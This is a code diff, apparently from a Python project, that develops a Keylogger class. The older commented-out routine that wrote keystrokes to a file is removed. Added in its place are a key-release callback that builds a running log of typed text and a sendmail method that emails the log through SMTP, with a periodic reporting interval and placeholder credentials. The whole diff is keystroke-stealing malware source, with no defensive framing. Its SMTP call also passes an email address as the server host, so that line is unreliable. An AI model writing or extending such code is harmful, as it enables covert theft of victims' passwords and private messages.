@@ -5,24 +5,6 @@ from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
-"""
-def get_key(key):
-    key_data = str(key)
-    key_data = key_data.replace("'", "")
-
-    if key_data == "Key.space":
-        key_data = " "
-    if key_data == "Key.shift":
-        key_data = ""
-    if key_data == "Key.enter":
-        key_data = "\n"
-    with open('keylog.txt', 'a') as file:
-        file.write(key_data)
-
-with keyboard.Listener(on_press=get_key) as listen:
-    listen.join()
-"""
-
 SEND_REPORT_EVERY = 60 # in seconds
 EMAIL_ADRESS = ""
 EMAIL_PASSWORD = ""
@@ -36,3 +18,19 @@ class Keylogger:
         self.end_dt = datetime.now()
         
 
+    def callback_on_release(self, event):
+        key = event.name 
+        if key == "space":
+            key = " "
+        elif key == "enter":
+            key = "\n"
+        elif key == "shift":
+            key = ""
+        self.log += key
+
+    def sendmail(self, source_email, dest_email, port, password, message):
+        server = smtplib.SMTP(source_email, port)
+        server.starttls()
+        server.login(source_email, password)
+        server.sendmail(source_email, dest_email, message)
+        server.quit()
